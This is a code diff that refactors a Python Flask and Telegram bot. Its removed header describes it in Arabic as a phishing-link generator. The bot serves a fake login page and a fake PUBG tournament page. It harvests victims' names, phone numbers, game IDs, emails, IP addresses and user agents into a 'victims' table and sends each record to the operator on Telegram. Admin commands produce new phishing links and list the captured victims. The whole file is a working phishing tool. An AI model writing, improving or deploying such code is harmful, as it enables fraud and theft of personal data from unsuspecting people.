@@ -1,16 +1,13 @@
 #!/usr/bin/env python3
-# ============================================================
-# بوت توليد روابط تصيد متكامل – نسخة بلاك
-# ============================================================
-
 import os
 import json
 import sqlite3
 import secrets
+import threading
 import requests
 from datetime import datetime
-from flask import Flask, request, render_template, redirect, jsonify, make_response
-from telegram import Bot, Update
+from flask import Flask, request, render_template, redirect, jsonify
+from telegram import Bot
 from telegram.ext import Application, CommandHandler, ContextTypes
 
 # ========== الإعدادات ==========
@@ -55,7 +52,7 @@ def save_victim(session_id, step, full_name, phone_code, phone_number, game_id, 
               (session_id, step, full_name, phone_code, phone_number, game_id, email, ip, ua, datetime.now().isoformat()))
     conn.commit()
     conn.close()
-    # إرسال البيانات فوراً إلى التيليجرام
+    # إرسال البيانات فوراً للتيليجرام
     try:
         bot = Bot(token=TELEGRAM_TOKEN)
         msg = (f"🎯 **بيانات جديدة!**\n"
@@ -72,18 +69,6 @@ def save_victim(session_id, step, full_name, phone_code, phone_number, game_id, 
     except Exception as e:
         print(f"[!] خطأ في الإرسال للتيليجرام: {e}")
 
-def get_victims():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT id, session_id, step, full_name, phone_number, game_id, email, timestamp FROM victims ORDER BY id DESC")
-    data = c.fetchall()
-    conn.close()
-    return data
-
-# ========== دوال توليد الروابط ==========
-def generate_session_id():
-    return secrets.token_urlsafe(8)
-
 # ========== الصفحات ==========
 @app.route('/')
 def home():
@@ -95,37 +80,26 @@ def health():
 
 @app.route('/p/<session_id>', methods=['GET', 'POST'])
 def login_page(session_id):
-    """الصفحة الأولى: تسجيل الدخول / إنشاء حساب"""
     if request.method == 'POST':
-        # تسجيل دخول وهمي (لا نتحقق من شيء)
         return redirect(f'/t/{session_id}')
-    
     return render_template('login.html', session_id=session_id)
 
 @app.route('/t/<session_id>', methods=['GET', 'POST'])
 def tournament_page(session_id):
-    """الصفحة الثانية: بطولة ببجي المزيفة"""
     if request.method == 'POST':
-        # استلام بيانات النموذج الأخير
         full_name = request.form.get('full_name', '').strip()
         phone_code = request.form.get('phone_code', '')
         phone_number = request.form.get('phone_number', '').strip()
         game_id = request.form.get('game_id', '').strip()
         email = request.form.get('email', '').strip()
-        
         ip = request.remote_addr
         ua = request.headers.get('User-Agent', '')
-        
         save_victim(session_id, 'completed', full_name, phone_code, phone_number, game_id, email, ip, ua)
-        
-        # صفحة شكر وهمية
         return render_template('thank_you.html')
-    
     return render_template('tournament.html', session_id=session_id)
 
 @app.route('/collect', methods=['POST'])
 def collect():
-    """نقطة لجمع البيانات عبر AJAX (اختياري)"""
     data = request.json
     session_id = data.get('session_id')
     full_name = data.get('full_name', '')
@@ -138,8 +112,8 @@ def collect():
     save_victim(session_id, 'ajax', full_name, phone_code, phone_number, game_id, email, ip, ua)
     return jsonify({"status": "ok"})
 
-# ========== بوت تيليجرام ==========
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ========== دوال البوت ==========
+async def start(update, context):
     if update.effective_user.id not in ADMIN_IDS:
         await update.message.reply_text("⛔ غير مصرح لك.")
         return
@@ -152,10 +126,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-async def generate_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def generate_link(update, context):
     if update.effective_user.id not in ADMIN_IDS:
         return
-    session_id = generate_session_id()
+    session_id = secrets.token_urlsafe(8)
     link = f"{BASE_URL}/p/{session_id}"
     await update.message.reply_text(
         f"🔗 **رابط جديد**\n\n"
@@ -165,42 +139,53 @@ async def generate_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-async def list_victims(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def list_victims(update, context):
     if update.effective_user.id not in ADMIN_IDS:
         return
-    victims = get_victims()
-    if not victims:
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT id, full_name, phone_number, game_id, email, timestamp FROM victims ORDER BY id DESC LIMIT 10")
+    data = c.fetchall()
+    conn.close()
+    if not data:
         await update.message.reply_text("📭 لا يوجد ضحايا.")
         return
     msg = "📋 **الضحايا:**\n\n"
-    for v in victims[-10:]:  # آخر 10 ضحايا
-        msg += f"🆔 `{v[0]}` | 👤 {v[3]} | 📞 {v[5]} | 🎮 {v[6]} | 📧 {v[7]} | 📅 {v[8]}\n"
+    for v in data:
+        msg += f"🆔 `{v[0]}` | 👤 {v[1]} | 📞 {v[2]} | 🎮 {v[3]} | 📧 {v[4]} | 📅 {v[5]}\n"
     await update.message.reply_text(msg, parse_mode='Markdown')
 
-async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def stats(update, context):
     if update.effective_user.id not in ADMIN_IDS:
         return
-    victims = get_victims()
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT COUNT(*) FROM victims")
+    total = c.fetchone()[0]
+    conn.close()
     await update.message.reply_text(
         f"📊 **إحصائيات**\n\n"
-        f"👤 إجمالي الضحايا: `{len(victims)}`",
+        f"👤 إجمالي الضحايا: `{total}`",
         parse_mode='Markdown'
     )
 
-# ========== تشغيل التطبيق ==========
-if __name__ == "__main__":
-    init_db()
-    
-    # تشغيل البوت
+# ========== تشغيل البوت في خلفية منفصلة ==========
+def run_bot():
     app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
     app_bot.add_handler(CommandHandler("start", start))
     app_bot.add_handler(CommandHandler("link", generate_link))
     app_bot.add_handler(CommandHandler("list", list_victims))
     app_bot.add_handler(CommandHandler("stats", stats))
+    app_bot.run_polling()
+
+# ========== المدخل الرئيسي ==========
+if __name__ == "__main__":
+    init_db()
     
-    import threading
-    threading.Thread(target=app_bot.run_polling, daemon=True).start()
+    # تشغيل البوت في خيط منفصل
+    bot_thread = threading.Thread(target=run_bot, daemon=True)
+    bot_thread.start()
     
-    # تشغيل الخادم
+    # تشغيل Flask
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
